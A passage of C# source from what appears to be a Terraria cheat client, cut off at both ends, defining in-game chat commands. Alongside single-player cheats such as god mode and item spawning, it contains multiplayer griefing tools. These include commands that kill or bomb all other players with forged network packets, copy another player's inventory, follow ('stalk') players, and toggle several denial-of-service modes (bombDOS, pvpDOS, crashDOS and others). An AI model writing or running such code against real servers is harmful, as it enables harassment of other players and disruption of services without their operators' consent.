                Main.NewText("Usage: -help <page>", 255, 240, 20);
                return;
            }
            string num = "0";
            if (length == 2) num = args[1];
            if (!pages(helptxt, "Help", num, 25, 240, 20))
            {
                Main.NewText("Invalid page.", 255, 20, 20);
            }
        }

        public static void safemode(string[] args, int length, string full)
        {
            cmdLimit = !cmdLimit;
        }

        public static void wipe(string[] args, int length, string full)
        {
            cmdLimit = false; //BlueFly
            fullbright = false; //Doneski
            fullbrightcolor = Color.White; //cracker64
            noClip = false; //Doneski
            accuratePlayers = false; //Doneski
            freeCam = false; //Doneski
            godMode = false; //Doneski
            undead = false; //Doneski
            infiniteMana = false; //Doneski
            tileRange = 4; //Doneski
            tracking = false; //Doneski
            infiniteRockets = false; //Doneski
            slowFall = false; //Doneski
            waterWalk = false; //Doneski
            infiniteBreath = false; //Doneski
            thorns = false; //Doneski
            gravityControl = false; //Doneski
            noKnockback = false; //Doneski
            speedHack = 1f; //Doneski
            autoReuse = false; //Doneski
            infiniteStack = false; //Doneski
            infiniteJump = false; //Doneski
            fastUse = 1; //Doneski
            noAnimateSend = false; //Doneski
            noProjectileSend = false; //Doneski
            noMovementSend = false;
            capNetStats = false; //Doneski
            forceMaxStack = false; //Doneski
            GPSDisplay = true; //Doneski
            flashlight = false; //Doneski
            flashlightcolor = Color.FromNonPremultiplied(10, 10, 10, 10);//BlueFly
            showAllRecipes = false; //Doneski
            freeCrafting = false; //Doneski
            disableDebuffs = false; //Doneski
            allowRemoveDebuffs = true; //Doneski
            pickupRange = 38; //Doneski
            instantRespawn = false; //Doneski
            maxRespawn = false; //Doneski
            invisible = false; //Doneski
            showUI = true; //Doneski
            showRadar = true; //Doneski
            superJump = false; //Doneski
            uberDefense = false; //Doneski
            bypassNetMode = false; //Doneski
            useAlternativeSendData = false; //Doneski
            noFallDmg = false; //Doneski
            showInvis = false; //Doneski
            bombDOS = false;

            mouseMode = 0;
            mouseReleaseNeeded = true;
            brushType = 0;
            brushSize = 0;
            brushExtra = 0;

            followMode = 0;
            followTarget = 0;

            lastCommand = null;

            Main.NewText("Settings cleared.", 255, 240, 20);
            Main.SaveZidoSettings();
        }

        public static void bind(string[] args, int length, string full)
        {
            if (length < 3)
            {
                Main.NewText("Usage: -bind <key> [command]&[command]& ...", 255, 240, 20);
                return;
            }
            string gKey = args[1].ToUpper();
            List<string> usedKeys = new List<string> { Main.cUp, Main.cDown, Main.cLeft, Main.cRight, Main.cJump, Main.cThrowItem, Main.cInv, Main.cHeal, Main.cMana, Main.cBuff, Main.cHook, Main.cTorch, "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "F7", "F8", "F9", "F10", "F11" };
            List<string> remove = new List<string>(args);
            usedKeys.AddRange(bindkeys.ToArray());
            if (!usedKeys.Contains(gKey))
            {
                bindkeys.Add(gKey);
                string parse = full;
                parse = parse.Remove(parse.IndexOf(" "), 1);
                parse = parse.Substring(parse.IndexOf(" ") + 1);
                bindings.Add(parse);
                Main.NewText(parse + " - bound on :" + gKey, 255, 240, 20);
                Main.saveBinds();
            }
            else
            {
                Main.NewText("Key already in use.", 255, 20, 20);
            }
        }

        public static void binds(string[] args, int length, string full)
        {
            if (length > 2)
            {
                Main.NewText("Usage: -binds <page>", 255, 240, 20);
                return;
            }
            if (bindkeys.Count < 1)
            {
                Main.NewText("No binds found.", 255, 20, 20);
                return;
            }
            string num = "0";
            if (length == 2) num = args[1];
            List<string> snd = new List<string> { };
            int i = 0;
            foreach (string s in bindkeys)
            {
                snd.Add(s + " - " + bindings[i]);
                ++i;
            }
            if (!pages(snd, "Binds", num, 255, 145, 0))
            {
                Main.NewText("Invalid page.", 255, 20, 20);
            }
        }

        public static void unbind(string[] args, int length, string full)
        {
            if (length != 2)
            {
                Main.NewText("Usage: -unbind <key>", 255, 240, 20);
                return;
            }
            string gKey = args[1].ToUpper();
            if (bindkeys.Contains(gKey))
            {
                int ind = bindkeys.IndexOf(gKey);
                bindings.RemoveAt(ind);
                bindkeys.RemoveAt(ind);
                Main.NewText("Key unbound.", 255, 240, 20);
                Main.saveBinds();
            }
            else
            {
                Main.NewText("Key not bound.", 255, 20, 20);
            }
        }

        public static void unbindall(string[] args, int length, string full)
        {
            bindings.Clear();
            bindkeys.Clear();
            Main.saveBinds();
        }

        public static void bombdos(string[] args, int length, string full)
        {
            bombDOS = !bombDOS;
        }

        public static void npcdos(string[] args, int length, string full)
        {
            npcDOS = !npcDOS;
        }

        public static void pvpdos(string[] args, int length, string full)
        {
            pvpDOS = !pvpDOS;
        }

        public static void debuffdos(string[] args, int length, string full)
        {
            debuffDOS = !debuffDOS;
        }

        public static void dropdos(string[] args, int length, string full)
        {
            dropDOS = !dropDOS;
        }

        public static void crashdos(string[] args, int length, string full)
        {
            crashDOS = !crashDOS;
        }

        public static void usealt(string[] args, int length, string full)
        {
            useAlternativeSendData = !useAlternativeSendData;
        }

        public static void gui(string[] args, int length, string full)
        {
            showUI = !showUI;
        }

        public static void fullbrightness(string[] args, int length, string full)
        {
            fullbright = !fullbright;
        }

        public static void fbcolor(string[] args, int length, string full)
        {
            if (length == 4)
            {
                byte R = 255;
                byte G = 255;
                byte B = 255;
                byte.TryParse(args[1], out R);
                byte.TryParse(args[2], out G);
                byte.TryParse(args[3], out B);
                fullbrightcolor.R = R;
                fullbrightcolor.G = G;
                fullbrightcolor.B = B;
            }
            else
            {
                Main.NewText("Usage: -fbcolor [R] [G] [B]  (0-255 please)", 255, 240, 20);
            }
        }

        public static void noclip(string[] args, int length, string full)
        {
            noClip = !noClip;
            if (noClip)
                freeCam = false;
        }

        public static void accurateplayers(string[] args, int length, string full)
        {
            accuratePlayers = !accuratePlayers;
        }

        public static void freecam(string[] args, int length, string full)
        {
            freeCam = !freeCam;
            if (freeCam)
                noClip = false;
        }

        public static void god(string[] args, int length, string full)
        {
            godMode = !godMode;
        }

        public static void nodeath(string[] args, int length, string full)
        {
            undead = !undead;
        }

        public static void infmana(string[] args, int length, string full)
        {
            infiniteMana = !infiniteMana;
        }

        public static void range(string[] args, int length, string full)
        {
            if (length == 2)
                tileRange = Convert.ToInt16(args[1]);
            else if (tileRange > 4)
                tileRange = 4;
            else
                tileRange = 9999;
            if (cmdLimit && tileRange > 9999) tileRange = 9999; //BlueFly
        }

        public static void pickuprange(string[] args, int length, string full)
        {
            if (length == 2)
                pickupRange = Convert.ToInt16(args[1]);
            else if (pickupRange > 38)
                pickupRange = 38;
            else
                pickupRange = 9999;
            if (cmdLimit && pickupRange > 100) pickupRange = 100; //BlueFly
        }

        public static void track(string[] args, int length, string full)
        {
            tracking = !tracking;
        }

        public static void radar(string[] args, int length, string full)
        {
            showRadar = !showRadar;
        }

        public static void showinvis(string[] args, int length, string full)
        {
            showInvis = !showInvis;
        }

        public static void infrockets(string[] args, int length, string full)
        {
            infiniteRockets = !infiniteRockets;
        }

        public static void slowfall(string[] args, int length, string full)
        {
            slowFall = !slowFall;
        }

        public static void waterwalk(string[] args, int length, string full)
        {
            waterWalk = !waterWalk;
        }

        public static void infbreath(string[] args, int length, string full)
        {
            infiniteBreath = !infiniteBreath;
        }

        public static void thornbuff(string[] args, int length, string full)
        {
            thorns = !thorns;
        }

        public static void grav(string[] args, int length, string full)
        {
            if (noClip) return;
            gravityControl = !gravityControl;
        }

        public static void knockback(string[] args, int length, string full)
        {
            noKnockback = !noKnockback;
        }

        public static void speed(string[] args, int length, string full)
        {
            if (length == 2)
                speedHack = Convert.ToSingle(args[1]);
            else if (speedHack > 1)
                speedHack = 1.0f;
            else
                speedHack = 3.0f;
            if (cmdLimit && speedHack > 10) speedHack = 10; //BlueFly
        }

        public static void reuse(string[] args, int length, string full)
        {
            autoReuse = !autoReuse;
        }

        public static void infammo(string[] args, int length, string full)
        {
            infiniteStack = !infiniteStack;
        }

        public static void infjump(string[] args, int length, string full)
        {
            infiniteJump = !infiniteJump;
        }

        public static void fastuse(string[] args, int length, string full)
        {
            if (length == 2)
                fastUse = Convert.ToInt16(args[1]);
            else if (fastUse > 1)
                fastUse = 1;
            else
                fastUse = 30;
            if (cmdLimit && fastUse > 10) fastUse = 10; //BlueFly
        }

        public static void noanimate(string[] args, int length, string full)
        {
            noAnimateSend = !noAnimateSend;
        }

        public static void noprojectile(string[] args, int length, string full)
        {
            noProjectileSend = !noProjectileSend;
        }

        public static void capstats(string[] args, int length, string full)
        {
            capNetStats = !capNetStats;
        }

        public static void infstack(string[] args, int length, string full)
        {
            forceMaxStack = !forceMaxStack;
        }

        public static void gps(string[] args, int length, string full)
        {
            GPSDisplay = !GPSDisplay;
        }

        public static void light(string[] args, int length, string full)
        {
            flashlight = !flashlight;
        }

        public static void flashcolor(string[] args, int length, string full)
        {
            //BlueFly - Start (credit to cracker64 (code used from fullbright color))
            if (length == 4)
            {
                byte R = 255;
                byte G = 255;
                byte B = 255;
                byte.TryParse(args[1], out R);
                byte.TryParse(args[2], out G);
                byte.TryParse(args[3], out B);
                flashlightcolor.R = R;
                flashlightcolor.G = G;
                flashlightcolor.B = B;
            }
            else if (length > 1)
            {
                Main.NewText("Usage: -flashlight [R] [G] [B]  (0-255 please)", 255, 240, 20);
            }
            //BlueFly - End
        }

        public static void nodebuff(string[] args, int length, string full)
        {
            disableDebuffs = !disableDebuffs;
        }

        public static void allowdelbuff(string[] args, int length, string full)
        {
            allowRemoveDebuffs = !allowRemoveDebuffs;
        }

        public static void maxrespawn(string[] args, int length, string full)
        {
            maxRespawn = !maxRespawn;
        }

        public static void instantspawn(string[] args, int length, string full)
        {
            instantRespawn = !instantRespawn;
        }

        public static void nofall(string[] args, int length, string full)
        {
            noFallDmg = !noFallDmg;
        }

        public static void showrecipes(string[] args, int length, string full)
        {
            showAllRecipes = !showAllRecipes;
        }

        public static void uberdef(string[] args, int length, string full)
        {
            uberDefense = !uberDefense;
        }

        public static void superjump(string[] args, int length, string full)
        {
            superJump = !superJump;
        }

        public static void fastmouse(string[] args, int length, string full)
        {
            mouseReleaseNeeded = !mouseReleaseNeeded;
        }

        public static void freecrafting(string[] args, int length, string full)
        {
            freeCrafting = !freeCrafting;
            Recipe.numRecipes = 0;
            for (int i = 0; i < Recipe.maxRecipes; i++)
            {
                Main.recipe[i] = new Recipe();
                Main.availableRecipeY[i] = 0x41 * i;
            }
            Recipe.SetupRecipes();
        }

        public static void invis(string[] args, int length, string full)
        {
            invisible = !invisible;
        }

        public static void shoot(string[] args, int length, string full)
        {
            int shoot;
            if (length == 2 && int.TryParse(args[1], out shoot))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].shoot = shoot;
                Main.NewText("Shoot set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].shoot, 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -shoot <projectileID>", 255, 240, 20);
            }
        }

        public static void usetime(string[] args, int length, string full)
        {
            int useTime;
            if (length == 2 && int.TryParse(args[1], out useTime))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].useTime = useTime;
                Main.NewText("useTime set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].useTime, 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -usetime <speed>", 255, 240, 20);
            }
        }

        public static void ammo(string[] args, int length, string full)
        {
            int ammo;
            if (length == 2 && int.TryParse(args[1], out ammo))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].ammo = ammo;
                Main.NewText("Ammo set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].ammo, 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -ammo <itemID>", 255, 240, 20);
            }
        }

        public static void shootspeed(string[] args, int length, string full)
        {
            int shootSpeed;
            if (length == 2 && int.TryParse(args[1], out shootSpeed))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].shootSpeed = shootSpeed;
                Main.NewText("ShootSpeed set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].shootSpeed, 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -shootspeed <speed>", 255, 240, 20);
            }
        }

        public static void damage(string[] args, int length, string full)
        {
            int damage;
            if (length == 2 && int.TryParse(args[1], out damage))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].damage = damage;
                Main.NewText("Damage set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].damage, 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -damage <damage>", 255, 240, 20);
            }
        }

        public static void pick(string[] args, int length, string full)
        {
            int pick;
            if (length == 2 && int.TryParse(args[1], out pick))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].pick = pick;
                Main.NewText("Pick power set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].pick + "%", 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -pick <power>", 255, 240, 20);
            }
        }

        public static void hammer(string[] args, int length, string full)
        {
            int hammer;
            if (length == 2 && int.TryParse(args[1], out hammer))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].hammer = hammer;
                Main.NewText("Hammer power set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].hammer + "%", 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -hammer <power>", 255, 240, 20);
            }
        }

        public static void axe(string[] args, int length, string full)
        {
            int axe;
            if (length == 2 && int.TryParse(args[1], out axe))
            {
                Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].axe = axe;
                Main.NewText("Axe power set: " + Main.player[Main.myPlayer].inventory[Main.player[Main.myPlayer].selectedItem].axe + "%", 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -axe <power>", 255, 240, 20);
            }
        }

        public static void watch(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                freeCam = false;
                followMode = 0;
                return;
            }
            int cftarget = GetPlayer(full.Substring(full.IndexOf(' ')));
            if (cftarget < 0)
            {
                Main.NewText("Player not found!", 255, 20, 20);
                return;
            }
            freeCam = true;
            followMode = 1;
            followTarget = cftarget;
            Main.NewText("Watching " + Main.player[cftarget].name, 255, 240, 20);
        }

        public static void stalk(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                noClip = false;
                followMode = 0;
                return;
            }
            int ftarget = GetPlayer(full.Substring(full.IndexOf(' ')));
            if (ftarget < 0)
            {
                Main.NewText("Player not found!", 255, 20, 20);
                return;
            }
            noClip = true;
            followMode = 2;
            followTarget = ftarget;
            Main.NewText("Stalking " + Main.player[ftarget].name, 255, 240, 20);
        }

        public static void camto(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                Main.NewText("Usage: -camto <player>", 255, 240, 20);
                return;
            }
            int camtarget = GetPlayer(full.Substring(full.IndexOf(' ')));
            if (camtarget < 0)
            {
                Main.NewText("Player not found!", 255, 20, 20);
                return;
            }
            Main.player[Main.myPlayer].position = Main.player[camtarget].position;
            Main.NewText("Freecammed to " + Main.player[camtarget].name, 255, 240, 20);
        }

        public static void placetile(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int tileType;
            int tileSize = 1;
            if (int.TryParse(args[1], out tileType))
                brushType = tileType;
            else
                return;
            if (length >= 3 && int.TryParse(args[2], out tileSize))
                brushSize = tileSize;
            else
                brushSize = 1;
            mouseMode = 2;
            Main.NewText("Tile brush enabled: " + tileType.ToString() + " (" + tileSize.ToString() + ")", 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void placewall(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int wallType;
            int wallSize = 1;
            if (int.TryParse(args[1], out wallType))
                brushType = wallType;
            else
                return;
            if (length >= 3 && int.TryParse(args[2], out wallSize))
                brushSize = wallSize;
            else
                brushSize = 1;
            if (brushType >= Main.maxWallTypes || brushType < 0)
            {
                Main.NewText("Invalid wall type.", 255, 20, 20);
                return;
            }
            mouseMode = 3;
            Main.NewText("Wall brush enabled: " + wallType.ToString() + " (" + wallSize.ToString() + ")", 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void placeliquid(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int liquidType;
            int liquidSize = 1;
            byte liquidAmount = 255;
            if (int.TryParse(args[1], out liquidType))
                brushType = liquidType;
            else
                return;
            if (length >= 3 && int.TryParse(args[2], out liquidSize))
                brushSize = liquidSize;
            else
                brushSize = 1;
            if (length >= 4 && byte.TryParse(args[3], out liquidAmount))
                brushExtra = liquidAmount;
            else
                liquidAmount = 255;
            mouseMode = 4;
            Main.NewText("Liquid brush enabled: " + liquidType.ToString() + " (" + liquidSize.ToString() + ") (" + liquidAmount.ToString() + ")", 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void drawprojectile(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int projectile;
            int count = 1;
            if (int.TryParse(args[1], out projectile))
                brushType = projectile;
            else
                return;
            if (length >= 3 && int.TryParse(args[2], out count))
                brushSize = count;
            else
                brushSize = 1;
            mouseMode = 1;
            Main.NewText("Projectile brush enabled: " + projectile.ToString() + " (" + count.ToString() + ")", 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void drawitems(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int itemType;
            int itemStack = 1;
            if (int.TryParse(args[1], out itemType))
                brushType = itemType;
            else
                return;
            if (length >= 3 && int.TryParse(args[2], out itemStack))
                brushSize = itemStack;
            else
                brushSize = 1;
            mouseMode = 8;
            Main.NewText("Item drop brush enabled: " + itemType.ToString() + " (" + itemStack.ToString() + ")", 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void tpmouse(string[] args, int length, string full)
        {
            if (mouseMode != 9)
                mouseMode = 9;
            else
                mouseMode = 0;
        }

        public static void resetmouse(string[] args, int length, string full)
        {
            mouseMode = 0;
        }

        public static void removetile(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int tsize = 1;
            if (int.TryParse(args[1], out tsize))
                brushSize = tsize;
            else
                brushSize = 1;
            mouseMode = 5;
            Main.NewText("Remove tile brush enabled: " + tsize.ToString(), 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void removewall(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int wsize = 1;
            if (int.TryParse(args[1], out wsize))
                brushSize = wsize;
            else
                brushSize = 1;
            mouseMode = 6;
            Main.NewText("Remove wall brush enabled: " + wsize.ToString(), 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void removeliquid(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                mouseMode = 0;
                brushType = 0;
                return;
            }
            int lsize = 1;
            if (int.TryParse(args[1], out lsize))
                brushSize = lsize;
            else
                brushSize = 1;
            mouseMode = 7;
            Main.NewText("Remove liquid brush enabled: " + lsize.ToString(), 255, 240, 20);
            if (cmdLimit && brushSize > 50) brushSize = 50; //BlueFly
        }

        public static void spawn(string[] args, int length, string full)
        {
            Main.player[Main.myPlayer].Spawn();
            Main.NewText("Respawned", 255, 240, 20);
        }

        public static void tp(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                Main.NewText("Usage: -tp <player>", 255, 240, 20);
                return;
            }
            int target = GetPlayer(full.Substring(full.IndexOf(' ')));
            if (target < 0)
            {
                Main.NewText("Player not found!", 255, 20, 20);
                return;
            }
            Main.player[Main.myPlayer].position = Main.player[target].position;
            Main.NewText("Teleported to " + Main.player[target].name, 255, 240, 20);
        }

        public static void clear(string[] args, int length, string full)
        {
            recoveryInventory = Main.player[Main.myPlayer].inventory;
            recoveryArmor = Main.player[Main.myPlayer].armor;
            for (int i = 0; i < Main.player[Main.myPlayer].inventory.Length; i++)
            {
                Main.player[Main.myPlayer].inventory[i].SetDefaults("");
                Main.player[Main.myPlayer].inventory[i].active = false;
                Main.player[Main.myPlayer].inventory[i].name = "";
                Main.player[Main.myPlayer].inventory[i].type = 0;
                Main.player[Main.myPlayer].inventory[i].stack = 0;
            }
            Main.NewText("Cleared inventory", 255, 240, 20);
        }

        public static void recover(string[] args, int length, string full)
        {
            Main.player[Main.myPlayer].inventory = recoveryInventory;
            Main.player[Main.myPlayer].armor = recoveryArmor;
            Main.NewText("Recovering inventory", 255, 240, 20);
        }

        public static void killme(string[] args, int length, string full)
        {
            if (length > 1)
            {
                Main.player[Main.myPlayer].KillMe(999999, 0, false, full.Substring(full.IndexOf(' ')));
            }
            else
                Main.player[Main.myPlayer].KillMe(999999, 0);
            Main.NewText("Killed yourself", 255, 240, 20);
        }

        public static void kill(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                Main.NewText("Usage: -kill <player>", 255, 240, 20);
                return;
            }
            int killtarget = GetPlayer(full.Substring(full.IndexOf(' ')));
            if (killtarget < 0)
            {
                Main.NewText("Player not found!", 255, 20, 20);
                return;
            }
            int index = Projectile.NewProjectile(Main.player[killtarget].position.X, Main.player[killtarget].position.Y, 0, 0, 0x63, 999999, 0.0f, 0xff);
            if (Main.netMode == 1)
            {
                NetMessage.SendData(0x1b, -1, -1, "", index, 0f, 0f, 0f, 0);
            }
            Main.NewText("Killed " + Main.player[killtarget].name, 255, 240, 20);
        }

        public static void killall(string[] args, int length, string full)
        {
            int killplayers = 0;
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].active && i != Main.myPlayer)
                {
                    int index2 = Projectile.NewProjectile(Main.player[i].position.X, Main.player[i].position.Y, 0, 0, 0x63, 999999, 0.0f, 0xff);
                    if (Main.netMode == 1)
                    {
                        NetMessage.SendData(0x1b, -1, -1, "", index2, 0f, 0f, 0f, 0);
                    }
                    killplayers++;
                }
            }
            Main.NewText("Killed " + killplayers + " players", 255, 240, 20);
        }

        public static void bombplrs(string[] args, int length, string full)
        {
            int bombplayers = 0;
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].active && i != Main.myPlayer)
                {
                    int index2 = Projectile.NewProjectile(Main.player[i].position.X, Main.player[i].position.Y, 0, 0, 108, 999999, 0.0f, 0xff);
                    if (Main.netMode == 1)
                    {
                        NetMessage.SendData(0x1b, -1, -1, "", index2, 0f, 0f, 0f, 0);
                    }
                    bombplayers++;
                }
            }
            Main.NewText("Bombed " + bombplayers + " players", 255, 240, 20);
        }

        public static void killmobs(string[] args, int length, string full)
        {
            int killmobs = 0;
            for (int i = 0; i < Main.npc.Length; i++)
            {
                if (Main.npc[i].active && !Main.npc[i].friendly && !Main.npc[i].townNPC)
                {
                    Main.npc[i].StrikeNPC(999999, 90f, 1);
                    if (Main.netMode == 1)
                    {
                        NetMessage.SendData(0x1c, -1, -1, "", i, 999999, 90f, 1);
                    }
                    killmobs++;
                }
            }
            Main.NewText("Killed " + killmobs + " mobs", 255, 240, 20);
        }

        public static void killnpcs(string[] args, int length, string full)
        {
            int killnpc = 0;
            for (int i = 0; i < Main.npc.Length; i++)
            {
                if (Main.npc[i].active)
                {
                    Main.npc[i].StrikeNPC(999999, 90f, 1);
                    if (Main.netMode == 1)
                    {
                        NetMessage.SendData(0x1c, -1, -1, "", i, 999999, 90f, 1);
                    }
                    killnpc++;
                }
            }
            Main.NewText("Killed " + killnpc + " npcs", 255, 240, 20);
        }

        public static void backup(string[] args, int length, string full)
        {
            backupInventory = Main.player[Main.myPlayer].inventory;
            backupArmor = Main.player[Main.myPlayer].armor;
            Main.NewText("Backing up inventory", 255, 240, 20);
        }

        public static void restore(string[] args, int length, string full)
        {
            Main.player[Main.myPlayer].inventory = backupInventory;
            Main.player[Main.myPlayer].armor = backupArmor;
            Main.NewText("Restoring inventory backup", 255, 240, 20);
        }

        public static void fullstack(string[] args, int length, string full)
        {
            for (int k = 0; k < 0x31; k++)
            {
                Main.player[Main.myPlayer].inventory[k].stack = Main.player[Main.myPlayer].inventory[k].maxStack;
            }
            Main.NewText("Set all stacks to max", 255, 240, 20);
        }

        public static void itemprefix(string[] args, int length, string full)
        {
            byte prefix;
            if (length > 2 && byte.TryParse(args[1], out prefix))
            {
                if (prefix > 83)
                {
                    Main.NewText("Invalid prefix, must be 83 or less.", 255, 20, 20);
                    return;
                }
                string prefixitem = full.Substring(full.IndexOf(' ', full.IndexOf(' ') + 1)).Trim().ToProper();
                Main.player[Main.myPlayer].inventory[9].SetDefaults(prefixitem);
                Main.player[Main.myPlayer].inventory[9].Prefix(prefix);
                Main.player[Main.myPlayer].inventory[9].stack = Main.player[Main.myPlayer].inventory[9].maxStack;
                Main.NewText("Created " + Main.player[Main.myPlayer].inventory[9].name, 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -itemprefix <prefix> <itemName>", 255, 240, 20);
            }
        }

        public static void item(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                Main.NewText("Usage: -item <itemID/itemName>", 255, 240, 20);
                return;
            }
            int itemId;
            if (length == 2 && int.TryParse(args[1], out itemId))
            {
                Main.player[Main.myPlayer].inventory[9].netDefaults(itemId);
                Main.player[Main.myPlayer].inventory[9].stack = Main.player[Main.myPlayer].inventory[9].maxStack;
                Main.NewText("Created " + Main.player[Main.myPlayer].inventory[9].name, 255, 240, 20);
            }
            else
            {
                string item = full.Substring(full.IndexOf(' ')).Trim().ToProper();
                Main.player[Main.myPlayer].inventory[9].SetDefaults(item);
                Main.player[Main.myPlayer].inventory[9].stack = Main.player[Main.myPlayer].inventory[9].maxStack;
                Main.NewText("Created " + Main.player[Main.myPlayer].inventory[9].name, 255, 240, 20);
            }
        }

        public static void chest(string[] args, int length, string full)
        {
            int chest;
            if (length > 1 && int.TryParse(args[1], out chest))
            {
                if (Main.chest[chest] != null)
                {
                    Main.player[Main.myPlayer].chest = chest;
                    Main.NewText("Open chest changed", 255, 240, 20);
                }
                else
                    Main.NewText("Cannot open unloaded chest", 255, 240, 20);
            }
            else
            {
                Main.NewText("Usage: -chest <chestID>  :Current open chest: " + Main.player[Main.myPlayer].chest, 255, 240, 20);
            }
        }

        public static void home(string[] args, int length, string full)
        {
            if (homeLoc.X != 0 && homeLoc.Y != 0)
            {
                Main.player[Main.myPlayer].position = homeLoc;
                Main.NewText("Going home", 255, 240, 20);
            }
            else
            {
                Main.NewText("No home set! Use -sethome", 255, 20, 20);
            }
        }

        public static void sethome(string[] args, int length, string full)
        {
            homeLoc = Main.player[Main.myPlayer].position;
            Main.NewText("Set home location", 255, 240, 20);
        }

        public static void steal(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                Main.NewText("Usage: -steal <player>", 255, 240, 20);
                return;
            }
            recoveryInventory = Main.player[Main.myPlayer].inventory;
            recoveryArmor = Main.player[Main.myPlayer].armor;
            int clonetarget = GetPlayer(full.Substring(full.IndexOf(' ')));
            if (clonetarget < 0)
            {
                Main.NewText("Player not found!", 255, 20, 20);
                return;
            }
            Main.player[Main.myPlayer].armor = Main.player[clonetarget].armor;
            Main.player[Main.myPlayer].inventory = Main.player[clonetarget].inventory;
            Main.NewText("Copied " + Main.player[clonetarget].name + " inventory", 255, 240, 20);
        }

        public static void healplrs(string[] args, int length, string full)
        {
            int healplayers = 0;
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].active && i != Main.myPlayer)
                {
                    for (int j = 0; j < 20; j++)
                    {
                        int index3 = Item.NewItem((int)Main.player[i].position.X, (int)Main.player[i].position.Y, Main.player[i].width, Main.player[i].height, 0x3a, 1, false, 0);
                        if (Main.netMode == 1)
                        {
                            NetMessage.SendData(21, -1, -1, "", index3, 0f, 0f, 0f, 0);
                        }
                    }
                    healplayers++;
                }
            }
            Main.NewText("Healed " + healplayers + " players", 255, 240, 20);
        }

        public static void manaplrs(string[] args, int length, string full)
        {
            int manaplayers = 0;
            for (int i = 0; i < Main.player.Length; i++)
            {
                if (Main.player[i].active && i != Main.myPlayer)
                {
                    for (int j = 0; j < 10; j++)
                    {
                        int index4 = Item.NewItem((int)Main.player[i].position.X, (int)Main.player[i].position.Y, Main.player[i].width, Main.player[i].height, 0xb8, 1, false, 0);
                        if (Main.netMode == 1)
                        {
                            NetMessage.SendData(21, -1, -1, "", index4, 0f, 0f, 0f, 0);
                        }
                    }
                    manaplayers++;
                }
            }
            Main.NewText("Manaed " + manaplayers + " players", 255, 240, 20);
        }

        public static void heal(string[] args, int length, string full)
        {
            if (length <= 1)
            {
                Main.player[Main.myPlayer].statLife = Main.player[Main.myPlayer].statLifeMax;
                Main.player[Main.myPlayer].statMana = Main.player[Main.myPlayer].statManaMax;
                Main.NewText("Healed yourself", 255, 240, 20);
                return;
            }
            int healtarget = GetPlayer(full.Substring(full.IndexOf(' ')));
            if (healtarget < 0)
            {
                Main.NewText("Player not found!", 255, 20, 20);
                return;
            }
            for (int i = 0; i < 10; i++)
            {
                int index3 = Item.NewItem((int)Main.player[healtarget].position.X, (int)Main.player[healtarget].position.Y, Main.player[healtarget].width, Main.player[healtarget].height, 0x3a, 1, false, 0);
                int index4 = Item.NewItem((int)Main.player[healtarget].position.X, (int)Main.player[healtarget].position.Y, Main.player[healtarget].width, Main.player[healtarget].height, 0xb8, 1, false, 0);
                if (Main.netMode == 1)
                {
